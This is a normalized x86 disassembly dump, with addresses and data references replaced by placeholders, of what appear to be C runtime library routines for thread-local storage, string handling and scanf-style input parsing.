mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013e62
call sub_1000ed69
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_10013e6b
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_10013cf6
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_10015ac2
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_10013c5b
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_1000ced5
pop ecx
xor esi esi
push 0x0
push esi
call sub_10013d84
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10013efe
push 0x8
push r--data
call sub_1000ed24
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1000ed69
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_1000ced5
pop ecx
push 0xd
call sub_100120e7
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_1000ced5
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10014018
push 0xc
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10014024
push esi
call sub_1000ced5
pop ecx
push edi
call sub_10013a93
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_1000ced5
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_100138bb
pop ecx
sub_1001402d
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_10013c5b
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_10013efe
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1001409b
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_10012bde
pop ecx
call sub_10013d47
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_10013ccd
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_10012ea3
push [ rw-data ]
call sub_10013be0
push [ rw-data ]
mov [ rw-data ] eax
call sub_10013be0
push [ rw-data ]
mov [ rw-data ] eax
call sub_10013be0
push [ rw-data ]
mov [ rw-data ] eax
call sub_10013be0
add esp 0x10
mov [ rw-data ] eax
call sub_10011f6b
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_10013efe
push [ rw-data ]
call sub_10013c5b
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_10015ac2
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_10013c5b
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_10013d84
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_10014228
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_1000d1a7
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1000ecdb
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10017da6
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_10015bb6
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10018b5c
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001433d
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10014228
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_10014370
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_100143d1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_1000ecdb
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_1000ecdb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000d8e6
add esp 0x14
mov eax esi
jmp r-xdata
sub_10014440
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_100144cb
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_10015b5c
add esp 0xc
test eax eax
je r-xdata
call sub_10015ac2
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_100109a0
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_10014522
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_1000d9f3
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_1001456b
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_1000daf8
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_10014542
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_10014595
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x1e4 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x19c ] eax
mov [ ebp - 0x1ac ] ecx
mov [ ebp - 0x1dc ] 0x15e
mov [ ebp - 0x1d0 ] esi
mov [ ebp - 0x1e8 ] esi
mov [ ebp - 0x188 ] esi
cmp edi esi
jne r-xdata
cmp eax esi
je r-xdata
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000c0a5
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x1f8 ]
call sub_1000d1a7
mov al [ edi ]
mov [ ebp - 0x19d ] 0x0
mov [ ebp - 0x18c ] esi
mov [ ebp - 0x1c4 ] esi
test al al
je r-xdata
push eax
call sub_1000c4bf
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
mov esi [ ebp - 0x19c ]
movzx eax al
push eax
call sub_1000daf8
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1f0 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edi ]
cmp al 0x25
jne r-xdata
dec [ ebp - 0x18c ]
push esi
push esi
lea esi [ ebp - 0x18c ]
call sub_1001456b
pop ecx
push eax
call sub_10014558
pop ecx
pop ecx
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_10014542
mov ebx eax
movzx eax [ edi ]
inc edi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x1b8 ] edi
cmp eax ebx
jne r-xdata
cmp [ edi + 0x1 ] al
je r-xdata
inc edi
movzx eax [ edi ]
push eax
call sub_1000daf8
pop ecx
test eax eax
jne r-xdata
jmp r-xdata
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
push esi
push ebx
jmp r-xdata
movzx eax bl
push eax
call sub_10017dde
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor esi esi
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1a8 ] esi
mov [ ebp - 0x1b4 ] esi
mov [ ebp - 0x194 ] esi
mov [ ebp - 0x19f ] 0x0
mov [ ebp - 0x1a0 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1ad ] 0x0
mov [ ebp - 0x19e ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x1d8 ] esi
mov al [ edi ]
test al al
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_10014558
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_10014542
movzx ecx [ edi ]
inc edi
mov [ ebp - 0x1b8 ] edi
cmp ecx eax
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x25
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x194 ]
inc [ ebp - 0x1b4 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x194 ] eax
jmp r-xdata
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
cmp [ edi ] 0x25
jne r-xdata
push esi
push eax
call sub_10014558
push esi
push ebx
call sub_10014558
add esp 0x10
dec [ ebp - 0x18c ]
mov edi eax
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x1ad ] 0x0
je r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1ac ]
call sub_1000ced5
pop ecx
mov eax [ ebp - 0x1b8 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
dec [ ebp - 0x195 ]
dec [ ebp - 0x18d ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc edi
movzx ebx [ edi ]
movzx eax bl
push eax
call sub_1000d9f3
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b8 ] edi
jne r-xdata
mov eax [ ebp - 0x1c4 ]
test eax eax
jne r-xdata
mov edi eax
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor esi esi
mov eax [ ebp - 0x1e4 ]
mov esi [ eax ]
mov [ ebp - 0x1fc ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
cmp [ ebp - 0x19d ] al
jne r-xdata
inc [ ebp - 0x1d8 ]
mov edi eax
mov [ ebp - 0x1cc ] esi
mov [ ebp - 0x1c8 ] esi
jmp r-xdata
inc [ ebp - 0x195 ]
inc [ ebp - 0x18d ]
jmp r-xdata
inc [ ebp - 0x1ad ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx eax [ edi ]
or eax 0x20
mov [ ebp - 0x1a4 ] eax
cmp eax 0x6e
je r-xdata
mov al [ edi ]
cmp al 0x53
je r-xdata
xor bl bl
mov [ ebp - 0x1bc ] esi
cmp [ ebp - 0x18d ] bl
jne r-xdata
mov ecx [ ebp - 0x1f0 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
mov cl [ edi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1b4 ]
test ecx ecx
je r-xdata
cmp eax 0x63
je r-xdata
mov [ ebp - 0x18d ] 0x1
mov [ ebp - 0x18d ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x195 ]
jmp r-xdata
mov eax [ ebp - 0x1a4 ]
cmp eax 0x6f
jg r-xdata
cmp [ ebp - 0x194 ] 0x0
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
cmp eax 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
sub eax 0x70
je r-xdata
je r-xdata
push [ ebp - 0x19c ]
push [ ebp - 0x188 ]
mov esi [ ebp - 0x1bc ]
mov edi [ ebp - 0x1b8 ]
push [ ebp - 0x19c ]
lea esi [ ebp - 0x18c ]
call sub_1001456b
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x195 ] 0x1
sub eax 0x3
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp eax 0x63
je r-xdata
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x1a0 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
push 0x64
pop edx
cmp eax edx
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
mov edi [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push edi
push [ ebp - 0x188 ]
mov [ ebp - 0x1c0 ] esi
call sub_10014558
pop ecx
pop ecx
mov [ ebp - 0x19e ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x194 ]
mov [ ebp - 0x1b4 ] 0x1
jle r-xdata
cmp cl 0x58
jne r-xdata
mov edi [ ebp - 0x1c0 ]
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_10014542
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ edi ]
cmp eax [ ebp - 0x188 ]
jne r-xdata
cmp eax 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x1a0 ] 0x0
je r-xdata
cmp [ ebp - 0x1a4 ] 0x78
je r-xdata
cmp [ ebp - 0x1a0 ] 0x0
mov edi [ ebp - 0x1c0 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x78
je r-xdata
mov bl 0x1
jmp r-xdata
dec [ ebp - 0x18c ]
push edi
push eax
call sub_10014558
pop ecx
pop ecx
cmp [ ebp - 0x1a4 ] 0x63
je r-xdata
cmp [ ebp - 0x1c0 ] esi
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x1a0 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jle r-xdata
dec [ ebp - 0x19d ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp eax 0x69
je r-xdata
cmp [ ebp - 0x1a4 ] 0x46
jne r-xdata
neg edi
movzx eax [ ebp - 0x188 ]
push eax
call sub_1000da77
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1a4 ] 0x70
je r-xdata
mov eax [ ebp - 0x1cc ]
mov ecx [ ebp - 0x1c8 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1cc ] eax
mov [ ebp - 0x1c8 ] ecx
jmp r-xdata
movzx eax [ ebp - 0x188 ]
push eax
call sub_1000da77
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1a4 ] 0x70
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x1a4 ] 0x73
jne r-xdata
push 0x30
pop esi
cmp [ ebp - 0x188 ] esi
jne r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
inc edi
cmp [ edi ] 0x5e
mov esi edi
jne r-xdata
mov [ ebp - 0x19e ] 0x1
mov edi [ ebp - 0x1b8 ]
inc [ ebp - 0x19d ]
inc edi
mov [ ebp - 0x1b8 ] edi
jmp r-xdata
mov eax [ ebp - 0x1fc ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1ac ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
mov [ ebp - 0x1a4 ] edx
cmp eax 0x6e
jne r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
and [ ebp - 0x1a8 ] 0x0
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_10014558
pop ecx
pop ecx
push [ ebp - 0x188 ]
shl edi 0x4
call sub_10014522
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_1000d9f3
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_10014558
pop ecx
pop ecx
mov esi [ ebp - 0x1cc ]
mov edi [ ebp - 0x1c8 ]
push [ ebp - 0x188 ]
shld edi esi 0x4
shl esi 0x4
call sub_10014522
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_1000d9f3
pop ecx
test eax eax
je r-xdata
inc [ ebp - 0x1c4 ]
cmp [ ebp - 0x1a4 ] 0x63
je r-xdata
inc [ ebp - 0x1c0 ]
jmp r-xdata
cmp [ ebp - 0x19e ] 0x0
je r-xdata
cmp [ ebp - 0x1a4 ] 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
cmp al 0x78
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_1000fe10
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
lea esi [ edi + 0x1 ]
mov [ ebp - 0x19f ] 0xff
cmp [ ebp - 0x1b4 ] 0x0
jne r-xdata
dec [ ebp - 0x194 ]
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
cmp [ ebp - 0x196 ] 0x0
mov edi [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x6f
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x6f
jne r-xdata
cmp [ ebp - 0x19e ] 0x0
je r-xdata
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
mov [ esi ] al
inc esi
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_10017dde
pop ecx
test eax eax
je r-xdata
movsx ebx [ ebp - 0x19f ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx ebx
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
cmp [ ebp - 0x1b4 ] 0x0
mov [ ebp - 0x188 ] eax
je r-xdata
cmp al 0x58
je r-xdata
mov bl 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
or [ ebp - 0x194 ] 0xffffffff
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c4 ]
mov esi [ ebp - 0x1bc ]
imul edi edi 0xa
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1c8 ]
push [ ebp - 0x1cc ]
call sub_10019260
mov esi eax
mov edi edx
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
lea eax [ ebp - 0x1f8 ]
push eax
mov eax [ ebp - 0x1f8 ]
mov [ ebp - 0x1e8 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1e8 ]
push eax
call sub_10017c75
mov ax [ ebp - 0x1e8 ]
add esp 0x10
mov [ esi ] ax
inc esi
inc esi
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_10014542
mov [ ebp - 0x1df ] al
mov [ ebp - 0x1a4 ] 0x78
jmp r-xdata
sub [ ebp - 0x194 ] 0x2
cmp [ ebp - 0x194 ] 0x1
jge r-xdata
cmp [ ebp - 0x1a4 ] 0x78
mov [ ebp - 0x1a8 ] 0x1
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_1000d9f3
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x195 ] 0x0
je r-xdata
mov eax [ ebp - 0x1cc ]
mov [ esi ] eax
mov eax [ ebp - 0x1c8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1a8 ]
cmp [ ebp - 0x1b4 ] 0x0
mov eax [ ebp - 0x188 ]
lea edi [ edi + eax - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
mov eax [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
add eax 0xffffffd0
cdq
add esi eax
adc edi edx
cmp [ ebp - 0x1b4 ] 0x0
mov [ ebp - 0x1cc ] esi
mov [ ebp - 0x1c8 ] edi
je r-xdata
mov esi [ ebp - 0x1cc ]
mov edi [ ebp - 0x1c8 ]
shld edi esi 0x3
shl esi 0x3
jmp r-xdata
mov [ ebp - 0x1bc ] esi
jmp r-xdata
inc bl
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push eax
call sub_10014558
pop ecx
pop ecx
mov [ ebp - 0x188 ] esi
jmp r-xdata
cmp [ ebp - 0x1b4 ] 0x0
